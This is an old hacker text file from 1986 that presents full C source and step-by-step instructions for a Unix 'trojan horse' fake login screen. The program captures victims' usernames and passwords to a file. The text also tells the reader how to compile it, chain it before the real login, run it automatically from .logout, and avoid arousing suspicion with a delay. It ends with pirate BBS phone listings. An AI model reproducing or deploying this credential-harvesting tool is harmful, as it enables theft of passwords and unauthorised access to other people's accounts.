-------------------
A UNIX Trojan Horse
-------------------

Written By Shooting Shark on 10 June 1986.  Released by Tiburon Systems
and R0DENTZWARE.

Disclaimer : I have *never* used the program below in any capacity except for testing it to see that it does indeed work perf
ectly.  I do not condone the use of such a program.  I am presenting it for information purposes only.  I will not be held li
able for any damages caused by the use of this program.

The following is a "trojan horse" program written in C for unix versions 4.2
and 4.3 (berkely unix) using the C-shell.  It might work on other versions of
unix, such as AT&T System V.  I haven't tried it.  This program simulates the
login for a unix machine.  When some poor fool enters his name and password,
they will be written to a file called "stuff" in your home direct ory in the
form:


user root has password joshua

if this file already exists, new password/login hacks will be appended to the
file...thus after you run the program several times you will have a nice
little database of hacked passwords.

How To Use The Program
----------------------

First, you'll need to configure the Hsource so that it will look like your
system's login when it is run (see below).  Then, put the source in a file
called horse.c and type the following:


cc horse.c -lcurses -ltermcap
mv a.out horse

and your ready-to-run program will be called 'horse'.  You will have to
invoke horse from a shellscript.  Create a new file and put these two lines
in it:


horse
login

Now when you 'source' this file, the horse program will be invooked and you
can leave your terminal and watch as somebody walks up to it and unknowingly
gives you their password.


If you like, you can append the above two lines to your ".logout" file,
and whenever you log out, the horse program will be run automatically.

------- source begins here --------

/* horse.c  - Trojan Horse program.  For entertainment purposes only.
 * Written by Shooting Shark.
 */

#include <curses.h>

main()
{
char name[10], password[10];
int i;
FILE *fp, *fopen();
initscr();

printf("\n\nPyramid Technology 4.2/5.0 UNIX (tiburon)\n\n\n\nlogin: ");

/* You will need to alter the above line so it prints your system's
header.  Each '\n' is a carriage return. */


scanf("%[^\n]",name);
getchar();
noecho();
printf("Password:");
scanf("%[^\n]",password);
printf("\n");
getchar();
echo();
sleep(5);

/* change the 'sleep(x)' above to give a delay similar to the delay your
system gives. An instant "Login incorrect" looks supicious. */


if ( ( fp = fopen("stuff","a") )  != -1 ) {
        fprintf(fp,"login %s has password %s\n",name,password);
        fclose(fp);
        }

printf("Login incorrect\n");
endwin();
}

--------- Source ends here. ---------

Note : in this program's present form, if somebody hits a ^C while your
program is running, they will be dumped into your shll and you might
be kicked out of your school or whatever.  If you know C, you can add a
signal structure to trap ^C's.

Call:

IDI..........415/344-6568
30 megs, IBM pirate line, Forum-PC software.

The Matrix...415/922-2008
101 megs (no shit), IBM wares, Forum-PC software.

The HQ of Shawn-Da-Lay Boy Productions, inc....415/236-2371
Mass Megs of Tfiles.  RoR - Alucard

-----




IDI4153446568
Press a key...
